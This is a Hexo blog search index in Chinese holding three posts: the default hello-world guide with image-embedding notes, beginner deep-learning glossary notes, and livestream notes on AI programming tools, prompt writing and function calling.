<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hexo初始指南</title>
    <url>/2024/07/01/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a class="header-anchor" href="#Quick-Start">¶</a>Quick Start</h2>
<h3 id="Create-a-new-post"><a class="header-anchor" href="#Create-a-new-post">¶</a>Create a new post</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">    printf(&quot;hello world!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Run-server"><a class="header-anchor" href="#Run-server">¶</a>Run server</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a class="header-anchor" href="#Generate-static-files">¶</a>Generate static files</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a class="header-anchor" href="#Deploy-to-remote-sites">¶</a>Deploy to remote sites</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
<h3 id="嵌入图片的操作探索"><a class="header-anchor" href="#嵌入图片的操作探索">¶</a>嵌入图片的操作探索</h3>
<ul>
<li>这一种是标签插件<br>
hexo-renderer-marked 3.1.0+ 可以（可选）自动解析图片的文章路径，参考 本节 如何启用它。</li>
</ul>
<p>“foo.jpg” 位于 <a href="http://example.com/2020/01/02/hello/foo.jpg%E3%80%82">http://example.com/2020/01/02/hello/foo.jpg。</a></p>
<p>默认（无选项）</p>

<img src="/.io//01/02/hello/foo.jpg">
自定义 class 属性

<img src="/.io//01/02/hello/foo.jpg" class="post-image">
展示尺寸

<img src="/.io//01/02/hello/foo.jpg" width="500" height="400">
title 和 alt 属性

<img src="/.io//01/02/hello/foo.jpg" title="lorem ipsum" alt="dolor">
<ul>
<li>这一种是辅助函数<br>
image_tag<br>
插入图片。</li>
</ul>
<p>&lt;%- image_tag(path, [options]) %&gt;<br>
选项	描述<br>
alt	图片的替代文字<br>
class	Class 名称<br>
id	ID<br>
width	图片宽度<br>
height	图片高度</p>
<ul>
<li>还有一种是使用markdown嵌入图片<br>
hexo-renderer-marked 3.1.0 引入了一个新的选项，其允许你无需使用 asset_img 标签插件就可以在 markdown 中嵌入图片</li>
</ul>
<p>如需启用：</p>
<p>_config.yml<br>
post_asset_folder: true<br>
marked:<br>
prependRoot: true<br>
postAsset: true<br>
启用后，资源图片将会被自动解析为其对应文章的路径。 例如： image.jpg 位置为 /2020/01/02/foo/image.jpg ，这表示它是 /2020/01/02/foo/ 文章的一张资源图片， <img src="/.io//image.jpg" alt> 将会被解析为 <img src="/.io//01/02/foo/image.jpg"> 。</p>
]]></content>
      <categories>
        <category>notes</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>【AI_Indoor】深度学习入门</title>
    <url>/2024/09/09/CS_Notes/AI/%E3%80%90AI_Indoor%E3%80%91%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h3 id="写在前面–链接留档"><a class="header-anchor" href="#写在前面–链接留档">¶</a>写在前面–链接留档</h3>
<ul>
<li>这一次学习就是带着任务来学的了喵</li>
<li><a href="https://linklearner.com/activity/16/14/40">跟李宏毅学深度学习(入门) - 学习说明</a>  几个Task和选修的所有链接都在这个文档</li>
<li><a href="https://github.com/datawhalechina/leedl-tutorial">datawhalechina/leedl-tutorial: 《李宏毅深度学习教程》（李宏毅老师推荐👍，苹果书🍎），PDF下载地址：https://github.com/datawhalechina/leedl-tutorial/releases</a></li>
<li><a href="https://github.com/datawhalechina/leedl-tutorial/releases">Releases · datawhalechina/leedl-tutorial (github.com)</a>  《李宏毅深度学习教程》pdf版</li>
</ul>

	<iframe src="https://www.slideshare.net/slideshow/embed_code/key/hsjUKwxbfrUN55?hostedIn=slideshare&amp;page=upload" style="width:100%;height:550px" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" allowfullscreen> </iframe> <div style="margin-bottom:5px">


<h2 id="第一章-机器学习基础"><a class="header-anchor" href="#第一章-机器学习基础">¶</a>第一章 机器学习基础</h2>
<h3 id="1-1-通过案例了解机器学习"><a class="header-anchor" href="#1-1-通过案例了解机器学习">¶</a>1.1 通过案例了解机器学习</h3>
<ul>
<li>
<p>回归（regression）</p>
</li>
<li>
<p>分类（classification）</p>
</li>
<li>
<p>结构化学习（structure learning）</p>
</li>
<li>
<p>领域知识（domain knowledge）</p>
</li>
<li>
<p>模型（model）：带有未知参数（parameter）的函数</p>
<ul>
<li>特征（feature）：模型中已知部分</li>
<li>权重（weight）<strong>w</strong></li>
<li>偏置（bias）<strong>b</strong></li>
</ul>
</li>
<li>
<p>损失（loss）</p>
<blockquote>
<p>损失的值与正确的值的绝对值</p>
</blockquote>
</li>
<li>
<p>标签（label）</p>
<blockquote>
<p>真实的值</p>
</blockquote>
</li>
<li>
<p>平均绝对误差（Mean Absolute Error， MAE）</p>
<blockquote>
<p>计算公式为：将所有绝对误差的和除以样本量</p>
</blockquote>
</li>
<li>
<p>均方误差（Mean Squared Error，MSE）</p>
<blockquote>
<p>它是指预测值与真实值之差的平方值的平均数</p>
<p>MSE越小，说明模型的预测结果越准确</p>
<p>它通常用于评估回归模型的性能</p>
</blockquote>
</li>
<li>
<p>交叉熵（cross entropy）</p>
<blockquote>
<p>交叉熵（Cross Entropy）是一种用于衡量两个概率分布之间差异的度量，通常用于机器学习和深度学习中的分类任务</p>
<p>特别是在训练神经网络时，交叉熵被用作损失函数（Loss Function）来评估模型的预测与真实标签之间的差异</p>
</blockquote>
</li>
<li>
<p>梯度下降（gradient descent）</p>
<blockquote>
<p>“梯度下降”是一个常用的优化算法，用于求解目标函数的最优解或局部最优解</p>
<p>它通过不断调整模型参数的值，使目标函数的值逐渐下降</p>
<p>具体来讲，每次迭代时，它计算目标函数的梯度（即函数在当前点处的斜率），并朝着梯度的反方向更新参数值，以使函数值下降</p>
<p>这个过程一直持续到目标函数的值收敛（即不再变化或变化极小），此时，算法得到的参数值就是目标函数的最优解或近似最优解。</p>
</blockquote>
</li>
<li>
<p>学习率（learning rate）</p>
<blockquote>
<p>学习率是机器学习算法中的一个参数，用来控制模型在每次迭代中对数据学习的速率</p>
<p>它表示模型每次更新参数时改变的量的大小</p>
<p>学习率越小，模型对数据的学习速度越慢，但可以降低其过拟合的风险</p>
<p>学习率越大，模型对数据的学习速度越快，但容易导致过拟合或者不稳定</p>
</blockquote>
</li>
<li>
<p>超参数（hyperparameter）</p>
<blockquote>
<p>超参数是机器学习算法中的一种参数，它通常是在算法运行之前设置的</p>
<p>与模型学习时自动获得的参数不同，超参数在运行模型之前必须由数据科学家或开发者选择并设置</p>
<p>一些常见的超参数包括学习率、正则化参数、分类器种类等</p>
<p>超参数的选择往往会影响模型的性能和准确度，因此需要进行反复的试验和调整</p>
</blockquote>
</li>
</ul>
<h3 id="1-2-了解线性模型"><a class="header-anchor" href="#1-2-了解线性模型">¶</a>1.2 了解线性模型</h3>
<ul>
<li>
<p>线性模型</p>
<blockquote>
<p>线性模型是一种广泛应用于统计学和机器学习中的模型，其基本假设是因变量与自变量之间存在线性关系</p>
<p>这种模型通常可以用一组线性方程来描述，并且可以通过最小化误差来确定模型的参数</p>
<p>线性模型的应用范围广泛，包括回归分析、分类问题、时间序列分析等</p>
</blockquote>
</li>
<li>
<p>PyTorch</p>
<blockquote>
<p>PyTorch是一种开源的Python机器学习库，由Facebook（META）的人工智能研究团队开发，基于C++实现，应用于人工智能领域，它可以帮助开发者更快地构建和部署机器学习模型</p>
</blockquote>
</li>
</ul>
</div>]]></content>
      <categories>
        <category>notes</category>
        <category>AI notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>【AI_indoor】AI编程开发</title>
    <url>/2024/07/19/CS_Notes/AI/%E3%80%90AI_indoor%E3%80%91AI%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>黑马的知识星球的第一次直播。。。睡前一看，播了四个多小时。。。逆天，不过放在旁边听了两个多小时，还是挺多干货的，故今日开始回放记录</p>
<p><a href="https://blog.csdn.net/Miracle_ps/article/details/114791335">Hexo 添加图片——不用插件，超简单_hexo添加图片-CSDN博客</a></p>

	<iframe src="https://www.slideshare.net/slideshow/embed_code/key/fIZ6YhyrfWCZ81?hostedIn=slideshare&amp;page=upload" style="width:100%;height:550px" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" allowfullscreen> </iframe> <div style="margin-bottom:5px">


<h2 id="引入"><a class="header-anchor" href="#引入">¶</a>引入</h2>
<h3 id="一些知名的AI工具"><a class="header-anchor" href="#一些知名的AI工具">¶</a>一些知名的AI工具</h3>
<ul>
<li>ChatGPT</li>
<li>Suno</li>
<li>Copilot</li>
<li>通义千问</li>
<li>Midjourney</li>
<li>Stable Diffusion</li>
<li>文心一言</li>
<li>……</li>
</ul>
<h2 id="认识AI"><a class="header-anchor" href="#认识AI">¶</a>认识AI</h2>
<h3 id="大语言模型"><a class="header-anchor" href="#大语言模型">¶</a>大语言模型</h3>
<ul>
<li>自然语言处理（Natural Language Processing, NLP）是深度学习的一个分支领域，专注于处理和理解人类语言。
<ul>
<li>大语言模型（Large Language Models，LLM ）是NLP领域最突出的一项技术方案，它通过大规模的预训练来学习人类语言，具备处理和生成人类语言文本的能力。LLM有很多种实现，例如OpenAI的GPT4o模型。</li>
</ul>
</li>
<li>常用大模型</li>
</ul>
<table>
<thead>
<tr>
<th><strong>大模型</strong></th>
<th><strong>对话产品</strong></th>
<th><strong>公司</strong></th>
<th><strong>地址</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>GPT-3.5、GPT-4o</td>
<td>ChatGPT</td>
<td>OpenAI</td>
<td><a href="https://chatgpt.com/">https://chatgpt.com/</a></td>
</tr>
<tr>
<td>Gemini-1.5 Pro</td>
<td>Gemini</td>
<td>Google</td>
<td><a href="https://gemini.google.com/">https://gemini.google.com/</a></td>
</tr>
<tr>
<td>Claude 3.5</td>
<td>Claude AI</td>
<td>Anthropic</td>
<td><a href="https://claude.ai/chats">https://claude.ai/chats</a></td>
</tr>
<tr>
<td>文心大模型3.5</td>
<td>文心一言</td>
<td>百度</td>
<td><a href="https://yiyan.baidu.com/">https://yiyan.baidu.com/</a></td>
</tr>
<tr>
<td>星火3.5</td>
<td>讯飞星火</td>
<td>科大讯飞</td>
<td><a href="https://xinghuo.xfyun.cn/desk">https://xinghuo.xfyun.cn/desk</a></td>
</tr>
<tr>
<td>Qwen-Max</td>
<td>通义千问</td>
<td>阿里巴巴</td>
<td><a href="https://tongyi.aliyun.com/qianwen/">https://tongyi.aliyun.com/qianwen/</a></td>
</tr>
<tr>
<td>Moonshoot</td>
<td>Kimi</td>
<td>月之暗面</td>
<td><a href="https://kimi.moonshot.cn/">https://kimi.moonshot.cn/</a></td>
</tr>
<tr>
<td>Yi-Large</td>
<td>零一万物</td>
<td>零一万物</td>
<td><a href="https://platform.lingyiwanwu.com/">https://platform.lingyiwanwu.com/</a></td>
</tr>
</tbody>
</table>
<h3 id="GPT原理"><a class="header-anchor" href="#GPT原理">¶</a>GPT原理</h3>
<ul>
<li>Generative Pre-trained Transformer
<ul>
<li><code>Generative</code>   生成式：根据上下文预测之后应该出现哪个文本，从而形成连续的文本输出</li>
<li><code>Pre-trained</code>  预训练：通过大规模的文本数据进行预训练，让大模型可以理解人类语言的语法、词性。</li>
<li><code>Transformer</code>   Transformer：深度学习的一种神经网络模型。多数AIGC模型都依赖于此。</li>
</ul>
</li>
<li>machine translation   机器翻译</li>
<li>voice-to-text   声音-文字转写</li>
<li>text-to-image    文本生成</li>
<li>推理预测     对于不合理的结构→可能出现幻觉</li>
</ul>
<h3 id="文本向量化"><a class="header-anchor" href="#文本向量化">¶</a>文本向量化</h3>
<ol>
<li>将文本转成一组浮点数，放入一个数组，作为多维空间坐标</li>
<li>通过训练调整向量坐标，使其在不同方向具备含义(GPT3采用12288维空间)</li>
</ol>
<h4 id="向量的相似度"><a class="header-anchor" href="#向量的相似度">¶</a>向量的相似度</h4>
<ul>
<li>
<p>向量的远近</p>
</li>
<li>
<p><strong><u>把词语转换成向量，放到向量空间中。通过向量之间的关系和相似度，来理解词语之间的关系</u></strong></p>
<ul>
<li>例如：“美丽”≈“漂亮”     “美丽”=-“丑陋”</li>
</ul>
</li>
<li>
<p>二维/三维都有</p>
</li>
<li>
<p>视频中的例子：</p>
<ul>
<li><code>E(queen)-E(king) ≈ E(woman)-E(man)</code>  发现这两组词只有性别上的差别</li>
<li><code>E(queen) ≈ E(king) + E(woman)-E(man)</code></li>
<li><code>E(niece)-E(nephew) ≈ E(woman)-E(man)</code></li>
<li><code>E(father)-E(mother) ≈ E(woman)-E(man)</code></li>
<li>E(汉堡) + E(美国) - E(中国) = E(肉夹馍)</li>
</ul>
</li>
</ul>
<h4 id="注意力机制"><a class="header-anchor" href="#注意力机制">¶</a>注意力机制</h4>
<ul>
<li>来源是谷歌的一篇论文</li>
<li>基于上下文，根据其中词语的坐标对向量进行修改，来计算出最终推理到的结果</li>
<li>给的上下文越多，关键词越多，就能进行越精确的调整</li>
<li>GPT有一万多维，计算量十分庞大。所以搜索不会是无穷无尽的，只会限定在<code>上下文(Context)</code>这个范围中</li>
</ul>
<h3 id="GPT的应用"><a class="header-anchor" href="#GPT的应用">¶</a>GPT的应用</h3>
<ul>
<li>
<p>因为记忆力短，所以无法完成复杂任务</p>
<ul>
<li>需要人对任务进行拆解，由AI完成其中的小部分，从而大大提升效率</li>
</ul>
</li>
<li>
<p>第一阶段：<code>AI Embedded</code>   AI嵌入    人类作为主导，任务比例高；由AI完成其中部分</p>
</li>
<li>
<p>第二阶段：<code>AI Copilot</code>   AI助手     1:1工作量     【目前是处于这个阶段】</p>
</li>
<li>
<p>第三阶段：<code>AI Agent</code>     AI智能体     人类来下达命令，AI来拆解任务，把任务块交给其他<code>Agent</code>来完成</p>
</li>
</ul>
<h2 id="AI编程"><a class="header-anchor" href="#AI编程">¶</a>AI编程</h2>
<h4 id="AI编程顾问"><a class="header-anchor" href="#AI编程顾问">¶</a>AI编程顾问</h4>
<ul>
<li>需求分析
<ul>
<li>ChatGPT</li>
<li>Coze/扣子</li>
<li>举例：我要开发一个小程序，帮助用户生成简单的小学算术题，还可以拍照批改用户的作业，记录试卷结果。
<ul>
<li>这样问的不够专业，得到的答案也不够符合需求</li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>产品设计</li>
<li>编码实现</li>
<li>测试与调试</li>
<li>部署与维护</li>
</ul>
<h4 id="需求分析"><a class="header-anchor" href="#需求分析">¶</a>需求分析</h4>
<h5 id="Prompt"><a class="header-anchor" href="#Prompt">¶</a>Prompt</h5>
<ul>
<li>提示词，即发给大模型的指令。是AI时代的编程语言</li>
</ul>
<h5 id="提示词的典型构成"><a class="header-anchor" href="#提示词的典型构成">¶</a>提示词的典型构成</h5>
<ul>
<li><strong>角色</strong>：给AI定义一个最匹配任务的角色</li>
<li><strong>提示</strong>：对任务进行描述</li>
<li><strong>上下文</strong>：给出与任务相关的其他背景信息</li>
<li><strong>例子</strong>：必要时给出举例，对输出的正确性有很大帮助</li>
<li><strong>输入</strong>：任务的输入信息</li>
<li><strong>输出</strong>：输出的有效格式，比如（JSON、XML）</li>
<li><strong>注意</strong>：
<ul>
<li>大模型对于Prompt开头和结尾的内容更敏感</li>
<li>一次写出完美的提示词不太现实，必须不断调试</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Prompt示例</span><br><span class="line"># 角色</span><br><span class="line">你是一名旅游策划师</span><br><span class="line"># 技能</span><br><span class="line">您能够根据以下内容指定旅行计划</span><br><span class="line">- 出发地和目的地</span><br><span class="line">- 人数</span><br><span class="line">-  行程安排（如果没有就根据热门景点推荐合理行程）</span><br><span class="line">- 交通方式</span><br><span class="line">- 旅行时间</span><br><span class="line">以上信息可以与用户交互来获取</span><br><span class="line"># 输出</span><br><span class="line">将旅行计划以表格的形式输出，方便阅读，表格包含下列内容：</span><br><span class="line">- 日期</span><br><span class="line">- 行程安排</span><br><span class="line">- 交通方式</span><br><span class="line">- 住宿安排</span><br></pre></td></tr></table></figure>
<ul>
<li>斯国一啊</li>
<li>优质提示词：<a href="https://github.com/ai-boost/awesome-prompts">https://github.com/ai-boost/awesome-prompts</a></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 还有一个提示词示例，看起来挺完善的</span><br><span class="line"># 角色</span><br><span class="line">你是一位经验丰富的产品经理，可以从产品设计、需求分析、功能设计、交互设计、业务建模、产品架构设计等方面为用户提供专业的产品建议和指导</span><br><span class="line"></span><br><span class="line">## 技能</span><br><span class="line">### 技能1：需求分析</span><br><span class="line">- 收集和分析用户需求，包括功能需求、性能需求、安全需求等。</span><br><span class="line">- 确定需求的优先级和重要性，为产品的开发和迭代提供指导。</span><br><span class="line"></span><br><span class="line">### 技能2：业务维度分析</span><br><span class="line">- 从市场分析、竞争分析、用户分析等维度进行分析，以确定产品的核心价值和定位。</span><br><span class="line">- 输出格式 ：</span><br><span class="line">	- 维度：&lt;业务维度名称&gt;</span><br><span class="line">	- 有利因素：&lt;该维度的有利因素&gt;</span><br><span class="line">	- 不利因素：&lt;该维度的不利因素&gt;</span><br><span class="line">	- 补充建议：&lt;针对不利因素的补充建议&gt;</span><br><span class="line">	</span><br><span class="line">### 技能3：功能设计</span><br><span class="line">- 根据用户需求和产品目标，设计产品的功能架构和模块。</span><br><span class="line">- 根据产品的功能规格说明书，明确功能的具体要求和实现方式。</span><br><span class="line">- 输出：功能架构图（例如层级结构图、模块关系图）。</span><br><span class="line"></span><br><span class="line">### 技能4：业务建模</span><br><span class="line">- 理解业务流程和业务规则，建立产品的业务模型和数据模型</span><br><span class="line">- 输出业务数据字段的表格，信息如下：</span><br><span class="line">	- 字段名：&lt;字段名称&gt;</span><br><span class="line">	- 定义：&lt;对字段的定义描述&gt;</span><br><span class="line">	- 示例：&lt;举例说明字段的用法&gt;</span><br><span class="line">	- 限制范围/枚举：&lt;字段的限制范围或可能的取值范围&gt;</span><br><span class="line">	- 是否必须：&lt;说明该字段是否为必须字段&gt;</span><br><span class="line">	</span><br><span class="line">### 技能5：交互设计</span><br><span class="line">- 设计产品的用户界面和交互流程，提供产品的易用性和用户满意度。</span><br><span class="line">- 输出：界面设计建议和草图</span><br><span class="line"></span><br><span class="line">## Workflow</span><br><span class="line">1. **确认需求：**通过需求分析确定功能模块和业务维度</span><br><span class="line">2. **业务维度分析：**我从多个维度分析需求文档，并提供补充建议</span><br><span class="line">3. **功能架构图：**我将输出功能架构图，并提供多种样式选项</span><br><span class="line">4. **业务数据字段：**我将输出业务数据字段，并提供详细说明</span><br><span class="line">5. **其他图表：**我将生成业务流程图、时序图和类图</span><br><span class="line"></span><br><span class="line">## 限制</span><br><span class="line">- 只处理与需求文档相关的内容</span><br><span class="line">- 确保输出内容准确、逻辑严谨、格式规范</span><br><span class="line">- 对于不明确或确缺失的信息，将向您询问或提出建议</span><br></pre></td></tr></table></figure>
<h5 id="Coze"><a class="header-anchor" href="#Coze">¶</a>Coze</h5>
<p>Coze中的机器人，有人设与回复逻辑，说明Prompt结构已经提前设计好，直接开始对话即可</p>
<h4 id="设计阶段"><a class="header-anchor" href="#设计阶段">¶</a>设计阶段</h4>
<ul>
<li>设计产品原型，UI</li>
<li>可用模型：
<ul>
<li>Galileo AI</li>
<li>v0</li>
<li>莫高设计</li>
</ul>
</li>
</ul>
<h5 id="Galileo-AI"><a class="header-anchor" href="#Galileo-AI">¶</a>Galileo AI</h5>
<ul>
<li>界面设计建议和草图
<ul>
<li>页面设计建议
<ol>
<li>主界面：包含题目生成入口、拍照批改入口、错题记录查看入口</li>
<li>题目生成界面：用户可以选择年级、题型和题目数量，然后点击生成按钮</li>
<li>拍照批改界面：用户上传照片，系统自动批改并显示结果</li>
<li>错题记录查看界面：显示用户的错题记录，用户可以查看详细信息并标记复习状态</li>
</ol>
</li>
<li>草图‘</li>
</ul>
</li>
<li>提交以上信息后，AI会在线生成效果图，期间可以根据个人需求进行调整。完成后保存效果图，放到v0中使用</li>
</ul>
<h5 id="v0"><a class="header-anchor" href="#v0">¶</a>v0</h5>
<ul>
<li>直接把产品原型的图片上传，v0会自动根据图片生成前端的代码</li>
<li>生成代码后，还可以在效果图中拖拽元素，相应的代码会在线调整</li>
<li>非常适合独立开发者</li>
</ul>
<h4 id="编码实现"><a class="header-anchor" href="#编码实现">¶</a>编码实现</h4>
<ul>
<li>通义灵码</li>
<li>文心快码</li>
<li>Copilot</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 角色</span><br><span class="line">你扮演一位经验丰富的程序员，根据用户的需求帮助用户完成业务功能开发。</span><br><span class="line"></span><br><span class="line"># 需求</span><br><span class="line">我需要开发一个根据年级生成算术题的接口。</span><br><span class="line">- 参数：年级，可以是1或2，分别代表一年级或二年级</span><br><span class="line">- 返回值：100道算术题</span><br><span class="line"></span><br><span class="line">一年级算术题包含3种类型：</span><br><span class="line">- 100以内的加法</span><br><span class="line">- 100以内的减法</span><br><span class="line">- 100以内3个数字的加减混合运算</span><br><span class="line"></span><br><span class="line">二年级算术题包含类型：</span><br><span class="line">- 表内乘法、除法</span><br><span class="line">- 加减乘除混合运算，运算数字为3个数，加减运算数字不超过100，乘除必须是表内乘除法，除法必须是整除</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>展示了一个IDEA里面的插件：<code>Baidu Comate</code>，还有阿里的通义千问，在<code>Plugins</code>里面搜索下载</li>
<li>通过演示的小学口算项目，可以发现AI生成的代码可以辅助完成基础框架，但是细节部分仍需要人工修改bug</li>
</ul>
<h5 id="AI代码助手"><a class="header-anchor" href="#AI代码助手">¶</a>AI代码助手</h5>
<ul>
<li>
<h5 id="Baidu-Comate-插件"><a class="header-anchor" href="#Baidu-Comate-插件">¶</a>Baidu Comate 插件</h5>
<ul>
<li>打开插件界面，有<code>/指令</code> <code>@插件</code> <code>#知识</code>  三个选项</li>
<li>举例：<code>知识→API→天气API</code> 选中，然后输入：<code>#天气查询   帮我生成一个查询天气的工具类</code>   即可基于百度的知识库生成代码</li>
<li>也可以查看腾讯云的API中心：<code>https://cloud.tencent.com/document/api/1004/30616</code>  这个是数学作业批改-速算题目批改接口</li>
<li>发送整个文档给Baidu Comate</li>
<li>Prompt：<code>https://cloud.tencent.com/document/api/1004/30616</code> ，请参考链接中的文档，分析一下这个接口的请求地址、请求参数、返回值格式等信息</li>
</ul>
</li>
</ul>
<h4 id="测试与调试"><a class="header-anchor" href="#测试与调试">¶</a>测试与调试</h4>
<ul>
<li>通义灵码</li>
<li>文心快码</li>
<li>Copilot</li>
</ul>
<h4 id="部署与维护"><a class="header-anchor" href="#部署与维护">¶</a>部署与维护</h4>
<ul>
<li>AI生成部署脚本</li>
<li>运维智能体</li>
</ul>
<h4 id="AI应用开发"><a class="header-anchor" href="#AI应用开发">¶</a>AI应用开发</h4>
<ul>
<li>文本分析
<ul>
<li>数据提取和格式化、坐席质检、舆情分析、文本摘要、知识库</li>
<li>推荐的工具：Coze内搜索相关插件、360AI浏览器</li>
</ul>
</li>
<li>多模态
<ul>
<li>Stable Diffusion、文生图、图生图、图像识别、视频生成、语音识别合成、数字人等</li>
<li></li>
</ul>
</li>
<li>机器人应用
<ul>
<li>AI智能客服机器人开发、对话管理、情感分析、个性化回复等</li>
</ul>
</li>
<li>智能体
<ul>
<li>AI金融分析、自动化办公、智慧医疗、工业/制造智能体、运维智能体</li>
</ul>
</li>
<li>自动驾驶
<ul>
<li>计算机视觉处理、车辆自动驾驶</li>
</ul>
</li>
</ul>
<h4 id="AI技术架构"><a class="header-anchor" href="#AI技术架构">¶</a>AI技术架构</h4>
<ul>
<li>纯Prompt问答
<ul>
<li>利用大模型的推理能力，通过Prompt提问来完成业务</li>
</ul>
</li>
<li>Agent + Function Calling
<ul>
<li>AI拆解业务，调用业务端提供的接口实现复杂业务</li>
</ul>
</li>
<li>Fine tuning
<ul>
<li>针对特有业务场景对基础大模型做数据训练和微调，以满足特定场景的需求</li>
</ul>
</li>
<li>RAG (Retrieval Augmented Generation)
<ul>
<li>给大模型外挂一个知识库，让大模型基于知识库内容做推理和回答</li>
</ul>
</li>
<li><strong><u>ai-programing操作指南↓↓↓</u></strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://nbviewer.org/github/brocademaple/bcmp-hexo-inside-storage/blob/main/ai-programing.ipynb&quot; width=&quot;100%&quot; height=&quot;600&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>（hexo中插入ipynb的方式：[向Hexo博客中插入Jupyter Notebook | Coder (<a href="http://lastknightcoder.github.io">lastknightcoder.github.io</a>)](<a href="https://lastknightcoder.github.io/hexo-blog/2020/10/28/%E5%90%91">https://lastknightcoder.github.io/hexo-blog/2020/10/28/向</a> Hexo 博客中插入 Jupyter Notebook/)）引用一下orz</li>
<li>现在讲到哪有点晕……</li>
<li><a href="https://bailian.console.aliyun.com/#/model-market">阿里云百炼-大模型服务平台</a>     国内国外的都有</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义方法，向大模型发送消息</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_completion</span>(<span class="params">prompt, model = model, temperature = <span class="number">0</span></span>):</span><br><span class="line">    messages = [</span><br><span class="line">        <span class="comment"># 定义角色</span></span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;你是一个旅行达人&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: prompt&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;assistant&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;answer&quot;</span>&#125;</span><br><span class="line">    ]</span><br><span class="line">    response = client.chat.completions.create(</span><br><span class="line">        model=model,</span><br><span class="line">        messages=messages,</span><br><span class="line">        temperature=temperature, <span class="comment"># 结果的随机性</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> response.choices[<span class="number">0</span>].message.content</span><br></pre></td></tr></table></figure>
<h5 id="Prompt问答"><a class="header-anchor" href="#Prompt问答">¶</a>Prompt问答</h5>
<ol>
<li>用户提出问题，提交给应用程序</li>
<li>应用程序发送Prompt给基础大模型</li>
<li>大模型返回响应给应用程序</li>
<li>程序返回响应给用户</li>
</ol>
<ul>
<li>特征：利用大模型推理能力完成应用端无法实现或难以实现的功能</li>
<li>应用场景：
<ul>
<li>文本摘要分析</li>
<li>舆情分析</li>
<li>坐席检查</li>
</ul>
</li>
</ul>
<h5 id="Function-Calling"><a class="header-anchor" href="#Function-Calling">¶</a>Function Calling</h5>
<ol>
<li>
<p>用户提出问题，提交给应用程序</p>
</li>
<li>
<p>应用程序发送Prompt和function定义给基础大模型</p>
<ol>
<li>大模型Agent进行任务分解</li>
<li>大模型调用程序API</li>
</ol>
</li>
<li>
<p>1 程序拼接函数结果，再次发送给Prompt给大模型</p>
</li>
<li>
<p>2 大模型生成回答</p>
</li>
</ol>
<p>（中间可能经过多轮这样的来回）</p>
<ol start="4">
<li>大模型返回响应给程序</li>
<li>程序返回响应给用户</li>
</ol>
<ul>
<li>
<p>特征：</p>
<ul>
<li>将应用端业务能力与AI大模型推理能力结合，简化复杂业务功能开发</li>
<li>利用应用端能力将AI与外部世界连接起来，弥补AI模型缺陷：
<ul>
<li>大模型不是无所不知</li>
<li>大模型知识往往比较落后</li>
<li>大模型逻辑是统计规律，不是真逻辑，存在幻觉</li>
</ul>
</li>
</ul>
</li>
<li>
<p>应用场景：</p>
<ul>
<li>智能体（旅行指南、日程安排等）</li>
<li>数据提取</li>
<li>数据聚合分析</li>
</ul>
</li>
<li>
<p>这一段结合.ipynb文件里面的代码讲的。。。所以回头会再细看一下</p>
</li>
<li></li>
</ul>
<h2 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h2>
